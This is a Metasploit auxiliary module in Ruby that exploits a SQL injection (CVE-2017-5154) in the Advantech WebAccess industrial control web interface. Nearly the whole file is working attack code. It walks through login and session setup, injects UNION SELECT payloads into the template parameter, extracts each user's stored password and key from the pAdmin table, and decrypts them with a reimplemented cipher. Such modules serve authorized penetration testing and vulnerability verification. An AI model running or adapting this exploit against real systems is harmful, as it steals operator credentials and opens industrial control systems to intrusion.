##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Advantech WebAccess ExlViewer updateTemplate SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability found in Advantech WebAccess.
        The updateTemplate class in ExlViewer does not validate the template parameter,
        which can be abused to inject additional SQL statements by the user, and extract
        sensitive information from the database.
      },
      'References'     =>
        [
          [ 'CVE', '2017-5154' ],
          [ 'ZDI', '17-043' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-17-012-01' ]
        ],
      'Author'         =>
        [
          'Unknown', # Would like to credit the person from Tenable, but who did it?
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Jan 12 2017"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The base path to Advantech WebAccess', '/']),
        OptString.new('WEBACCESSUSER', [false, 'The username to login', 'admin']),
        OptString.new('WEBACCESSPASS', [false, 'The password to login'])
      ], self.class)

    # To extract passwords, we need to know the users in advance, so we don't really
    # need the password options.
    deregister_options(
      'DB_ALL_CREDS', 'DB_ALL_PASS', 'BLANK_PASSWORDS', 'PASSWORD',
      'PASS_FILE', 'USERPASS_FILE', 'USER_AS_PASS'
    )
  end


  def do_login(opts={})
    vprint_status("Attempting to login as '#{datastore['WEBACCESSUSER']}:#{datastore['WEBACCESSPASS']}'")

    uri = normalize_uri(target_uri.path, 'broadweb', 'user', 'signin.asp')

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => uri,
      'cookie'    => "user=name=; #{opts[:sid1]}; #{opts[:sid2]}",
      'vars_post' => {
        'page' => '/',
        'pos'  => '',
        'username' => datastore['WEBACCESSUSER'],
        'password' => datastore['WEBACCESSPASS'].to_s, # Might be null
        'remMe'    => '',
        'submit1'  => 'Login'
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while trying to login')
    end

    if res.headers['Location'] && res.headers['Location'] == '/broadweb/bwproj.asp'
      print_good("Logged in as #{datastore['WEBACCESSUSER']}")
      return res.get_cookies.scan(/(user=.+);/).flatten.first || ''
    end

    print_error("Unable to login as '#{datastore['WEBACCESSUSER']}:#{datastore['WEBACCESSPASS']}'")

    nil
  end


  def get_project_info(opts)
    uri = normalize_uri(target_uri.path, 'broadweb', 'bwproj.asp')

    cookie_str  = ''
    cookie_str << "#{opts[:sid1]}; #{opts[:sid2]}; #{opts[:login_cookie]}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => cookie_str
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while collecting project info')
    end

    html = res.get_html_document
    html.search('a').each { |a|
      if a.attributes['href'].text =~ /bwMain\.asp\?pos=(.*)\&ProjIdbw=(\d*)\&ProjName=(.*)/
        return $2, $3
      end
    }

    fail_with(Failure::Unknown, 'Unable to collect project info')
  end


  def get_node_info(opts)
    uri = normalize_uri(target_uri.path, 'broadweb', 'bwMain.asp')

    cookie_str = ''
    cookie_str << "WinCE=1; #{opts[:sid1]}; #{opts[:sid2]}; #{opts[:login_cookie]}"

    #
    # This request sets the session variables for resources that can only be accessed
    # from bwMain.asp.
    #

    send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => cookie_str,
      'vars_get' => {
        'pos' => 'project',
        'ProjIdbw' => opts[:project_id],
        'ProjName' => opts[:project_name]
      }
    })

    uri = normalize_uri(target_uri.path, 'broadWeb', 'bwMainLeft.asp')

    #
    # After the session variables are set, the bwMainleft.asp will know what project
    # to look for, and display our node(s).
    #

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => cookie_str
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while accessing bwMainleft.asp')
    end

    #
    # Now we can collect the node
    #

    html = res.get_html_document
    html.search('a').each { |a|
      if a.attributes['href'].text =~ /bwMainRight\.asp\?pos=node&idbw=(\d*)&name=(.*)/
        return $1, $2
      end
    }

    fail_with(Failure::Unknown, 'Connection timed out while collecting node info')
  end


  def go_to_root
    vprint_status('Requesting /')
    uri = normalize_uri(target_uri.path)
    vprint_status("Grabbing ASP session ID from #{uri}")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri
    })

    unless res
      fail_with(Failure::Unknown, "Connection timed out while connecting to #{uri}")
    end

    res.get_cookies.scan(/(ASPSESSION.+);/).flatten.first || ''
  end


  def go_to_bwroot
    vprint_status('Requesting bwRoot.asp')
    uri = normalize_uri(target_uri.path, 'broadWeb', 'bwRoot.asp')
    vprint_status("Grabbing ASP session ID from #{uri}")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri
    })

    unless res
      fail_with(Failure::Unknown, "Connection timed out while connecting to #{uri}")
    end

    res.get_cookies.scan(/(ASPSESSION.+);/).flatten.first || ''
  end


  def go_to_wawexlviewer(opts)
    vprint_status('Requesting WaExlViewer.asp')
    uri = normalize_uri(target_uri.path, 'broadWeb', 'WaExlViewer', 'WaExlViewer.asp')

    cookie_str  = ''
    cookie_str << "#{opts[:sid1]}; #{opts[:sid2]}; #{opts[:login_cookie]}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => cookie_str,
      'vars_get' => {
        'nid'  => opts[:node_id],
        'name' => opts[:node_name]
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while accessing WaExlViewer.aspx')
    end
  end


  def go_to_dispcfglist(opts)
    vprint_status('Requesting dispCfgList.aspx')
    uri = normalize_uri(target_uri.path, 'WaExlViewer', 'dispCfgList.aspx')

    cookie_str  = ''
    cookie_str << "#{opts[:sid1]}; #{opts[:sid2]}; #{opts[:login_cookie]}"

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'cookie' => cookie_str,
      'vars_get' => {
        'idbw'  => opts[:node_id],
        'proj'  => opts[:project_name],
        'node' => opts[:node_name]
      },
      'vars_post' => {
        'projName' => opts[:project_name],
        'nodeName' => opts[:node_name],
        'waPath'   => 'C:\\WebAccess\\Node',
        'codePage' => '65001'
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while accessing WaExlViewer.aspx')
    end

    res.get_cookies.scan(/(ASP\.NET_SessionId=.+);/).flatten.first || ''
  end


  def go_to_openrpt(opts)
    vprint_status('Requesting openRpt.aspx')
    uri = normalize_uri(target_uri.path, 'WaExlViewer', 'openRpt.aspx')

    cookie_str  = ''
    cookie_str << "#{opts[:sid1]}; #{opts[:sid2]}; #{opts[:login_cookie]}; #{opts[:aspnet_sid]}"

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri,
      'cookie' => cookie_str,
      'vars_get' => {
        'uti' => '1',
        'uTiDisp' => '1',
        'mode'    => '1',
        'report'  => ''
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while requesting openRpt.aspx')
    end
  end


  def init_session_variables
    opts = {}

    # The root and main pages must be visited to grab our session IDs
    opts[:sid1] = go_to_root
    opts[:sid2] = go_to_bwroot
    vprint_status("First session ID: #{opts[:sid1]}")
    vprint_status("Second session ID: #{opts[:sid2]}")

    opts[:login_cookie] = do_login(opts)
    vprint_status("Login returned cookie: #{opts[:login_cookie]}")
    return unless opts[:login_cookie]

    # After logging in, we can grab project name and a node name
    opts[:project_id], opts[:project_name] = get_project_info(opts)
    opts[:node_id], opts[:node_name]       = get_node_info(opts)

    # The wawexlviewer and openrpt pages must be visited in order to set some session variables.
    # And they must be in this specific order.
    go_to_wawexlviewer(opts)
    opts[:aspnet_sid] = go_to_dispcfglist(opts)
    go_to_openrpt(opts)

    opts
  end


  def do_sqli(opts={})
    uri = normalize_uri(target_uri.path, 'WaExlViewer', 'updateTemplate.aspx')

    cookie_str = ''
    cookie_str << "#{opts[:sid1]}; #{opts[:sid2]}; #{opts[:login_cookie]}; #{opts[:aspnet_sid]}"

    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => uri,
      'encode_params' => false,
      'cookie' => cookie_str,
      'vars_get' => {
        'idbw'     => '1',
        'template' => "#{Rex::Text.rand_text_alpha(4)}.xlsx'#{opts[:sqli_str]}"
      }
    })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while performing SQL injection against updateTemplate.aspx')
    end

    res
  end


  def parse_sqli_result(res)
    if res.body =~ /var jsRptTempalte/
      leaked_data = res.body.scan(/imageName\":\"(.+)\",/).flatten.first || ''
      return leaked_data
    end

    ''
  end


  def check
    opts = init_session_variables
    expected_value = Rex::Text.rand_text_alpha(10)
    vprint_status("Value expected in the injection: #{expected_value}")
    opts[:sqli_str] = "union+all+select+1,2,3,4,'#{expected_value}',6+from+pAdmin"

    res = do_sqli(opts)

    if parse_sqli_result(res).include?(expected_value)
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end


  def get_password(opts)
    opts[:sqli_str] = "union+all+select+1,2,3,4,Password,6+from+pAdmin+where+UserName='#{opts[:username]}'%00"
    res = do_sqli(opts)
    parse_sqli_result(res)
  end


  def get_key(opts)
    opts[:sqli_str] = "union+all+select+1,2,3,4,Password2,6+from+pAdmin+where+UserName='#{opts[:username]}'%00"
    res = do_sqli(opts)
    parse_sqli_result(res)
  end


  def run
    creds = Metasploit::Framework::CredentialCollection.new(
      user_file: datastore['USER_FILE'],
      username:  datastore['USERNAME']
    )

    # The CredentialCollection object requires at least one password to return credentials.
    # Since we are only using it to enumerate users, we shove a fake password to trick it
    # into giving us the username list.
    creds.add_private('')

    opts = init_session_variables

    creds.each do |cred|
      opts[:username] = cred.public
      vprint_status("Trying user '#{cred.public}'")
      pass = get_password(opts)
      key  = get_key(opts)
      next if pass.blank? && key.blank?
      decrypted_pass = decrypt_password(pass, key)
      print_good("User #{cred.public}'s password is: #{decrypted_pass}")
      report_cred(user: cred.public, password: decrypted_pass, proof: "Hash=#{pass}, Key=#{key}")
    end
  end


  def report_cred(opts)
    service_data = {
      address: rhost,
      port: rport,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end


  def user_type(database)
    user_type = database

    unless database == "BAUser"
      user_type << " (Web Access)"
    end

    user_type
  end


  def decrypt_password(password, key)
    recovered_password = recover_password(password)
    recovered_key = recover_key(key)

    recovered_bytes = decrypt_bytes(recovered_password, recovered_key)
    password = []

    recovered_bytes.each { |b|
      if b == 0
        break
      else
        password.push(b)
      end
    }

    password.pack("C*")
  end


  private


  def recover_password(password)
    bytes = password.unpack("C*")
    recovered = []

    i = 0
    j = 0
    while i < 16
      low = bytes[i]
      if low < 0x41
        low = low - 0x30
      else
        low = low - 0x37
      end
      low = low * 16

      high = bytes[i+1]
      if high < 0x41
        high = high - 0x30
      else
        high = high - 0x37
      end

      recovered_byte = low + high
      recovered[j] = recovered_byte
      i = i + 2
      j = j + 1
    end

    recovered
  end


  def recover_key(key)
    bytes = key.unpack("C*")
    recovered = 0

    bytes[0, 8].each { |b|
      recovered = recovered * 16
      if b < 0x41
        byte_weight = b - 0x30
      else
        byte_weight = b - 0x37
      end
      recovered = recovered + byte_weight
    }

    recovered
  end


  def decrypt_bytes(bytes, key)
    result = []
    xor_table = [0xaa, 0xa5, 0x5a, 0x55]
    key_copy = key
    for i in 0..7
      byte = (crazy(bytes[i] ,8 - (key & 7)) & 0xff)
      result.push(byte ^ xor_table[key_copy & 3])
      key_copy = key_copy / 4
      key = key / 8
    end

    result
  end


  def crazy(byte, magic)
    result = byte & 0xff

    while magic > 0
      result = result * 2
        if result & 0x100 == 0x100
          result = result + 1
        end
        magic = magic - 1
    end

    result
  end

end

